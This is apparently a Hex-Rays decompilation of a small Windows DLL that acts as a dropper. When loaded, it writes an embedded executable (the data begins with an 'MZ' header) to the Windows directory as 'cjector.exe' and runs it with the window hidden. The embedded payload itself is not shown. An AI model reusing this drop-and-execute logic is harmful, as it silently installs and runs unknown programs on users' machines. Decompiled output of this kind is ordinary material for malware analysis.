/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
int __stdcall sub_1000119A(LPCSTR lpFileName); // idb
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);

//-------------------------------------------------------------------------
// Data declarations

CHAR Operation[] = "open"; // idb
CHAR String2[] = "\\cjector.exe"; // idb
CHAR FileName = '\0'; // idb
int dword_10003000[7] = { 21427, 23117, 1, 2, 65535, 64, 0 }; // weak


//----- (10001140) --------------------------------------------------------
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  if ( fdwReason == 1 )
  {
    GetWindowsDirectoryA(&FileName, 0x400u);
    lstrcatA(&FileName, String2);
    if ( sub_1000119A(&FileName) )
      ShellExecuteA(0, Operation, &FileName, 0, 0, 0);
  }
  return 1;
}

//----- (1000119A) --------------------------------------------------------
int __stdcall sub_1000119A(LPCSTR lpFileName)
{
  int v1; // ebx
  HANDLE hFile; // [esp+8h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-4h] BYREF

  v1 = 0;
  hFile = CreateFileA(lpFileName, 0xC0000000, 3u, 0, 2u, 0, 0);
  if ( hFile != (HANDLE)-1 )
  {
    WriteFile(hFile, &dword_10003000[1], dword_10003000[0], &NumberOfBytesWritten, 0);
    CloseHandle(hFile);
    v1 = 1;
  }
  return v1;
}
// 10003000: using guessed type int dword_10003000[7];

// nfuncs=8 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
